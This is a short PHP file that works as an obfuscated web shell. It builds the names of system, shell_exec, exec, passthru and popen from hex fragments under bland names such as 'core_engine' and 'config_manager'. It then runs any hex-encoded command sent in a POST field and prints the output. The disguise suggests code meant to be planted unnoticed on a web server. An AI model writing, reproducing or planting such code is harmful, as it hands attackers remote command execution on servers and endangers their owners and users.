<?php


$data_chunk1 = '3';
$data_chunk2 = '9';
$data_chunk3 = '7';
$data_chunk4 = '5';
$data_chunk5 = 'd';
$data_chunk6 = '6';
$data_chunk7 = '8';
$data_chunk8 = '1';
$data_chunk9 = '4';
$data_chunk10 = '0';
$data_chunk11 = 'f';
$data_chunk12 = 'e';
$data_chunk13 = '2';
$core_engine1 = pack("H*", '7'.$data_chunk1.'7'.$data_chunk2.$data_chunk3.'3'.'7'.'4'.'6'.$data_chunk4.'6'.$data_chunk5);
$core_engine2 = pack("H*", '7'.'3'.'6'.'8'.'6'.'5'.'6'.'c'.'6'.'c'.'5'.'f'.$data_chunk6.'5'.'7'.'8'.'6'.'5'.'6'.$data_chunk1);
$core_engine3 = pack("H*", $data_chunk6.$data_chunk4.'7'.$data_chunk7.'6'.$data_chunk4.'6'.'3');
$core_engine4 = pack("H*", '7'.'0'.$data_chunk6.$data_chunk8.'7'.$data_chunk1.'7'.$data_chunk1.'7'.$data_chunk9.$data_chunk6.'8'.$data_chunk3.'2'.$data_chunk3.'5');
$core_engine5 = pack("H*", '7'.$data_chunk10.$data_chunk6.$data_chunk11.'7'.'0'.'6'.'5'.$data_chunk6.$data_chunk12);
$core_engine6 = pack("H*", '7'.$data_chunk1.$data_chunk3.'4'.'7'.'2'.'6'.'5'.'6'.'1'.'6'.$data_chunk5.'5'.$data_chunk11.'6'.$data_chunk3.'6'.'5'.$data_chunk3.'4'.'5'.'f'.'6'.'3'.'6'.'f'.'6'.'e'.'7'.$data_chunk9.'6'.'5'.'6'.$data_chunk12.'7'.$data_chunk9.'7'.'3');
$core_engine7 = pack("H*", $data_chunk3.$data_chunk10.$data_chunk6.$data_chunk1.$data_chunk6.'c'.$data_chunk6.'f'.'7'.'3'.'6'.'5');
$config_manager = pack("H*", '6'.'3'.'6'.'f'.$data_chunk6.$data_chunk12.'6'.$data_chunk6.$data_chunk6.$data_chunk2.$data_chunk6.$data_chunk3.'5'.$data_chunk11.'6'.$data_chunk5.'6'.'1'.'6'.$data_chunk12.$data_chunk6.'1'.$data_chunk6.'7'.'6'.'5'.$data_chunk3.$data_chunk13);
if (isset($_POST[$config_manager])) {
    $config_manager = pack("H*", $_POST[$config_manager]);
    if (function_exists($core_engine1)) {
        $core_engine1($config_manager);
    } elseif (function_exists($core_engine2)) {
        print $core_engine2($config_manager);
    } elseif (function_exists($core_engine3)) {
        $core_engine3($config_manager, $rec_binding);
        print join("\n", $rec_binding);
    } elseif (function_exists($core_engine4)) {
        $core_engine4($config_manager);
    } elseif (function_exists($core_engine5) && function_exists($core_engine6) && function_exists($core_engine7)) {
        $symbol_item = $core_engine5($config_manager, 'r');
        if ($symbol_item) {
            $mrk_pointer = $core_engine6($symbol_item);
            $core_engine7($symbol_item);
            print $mrk_pointer;
        }
    }
    exit;
}
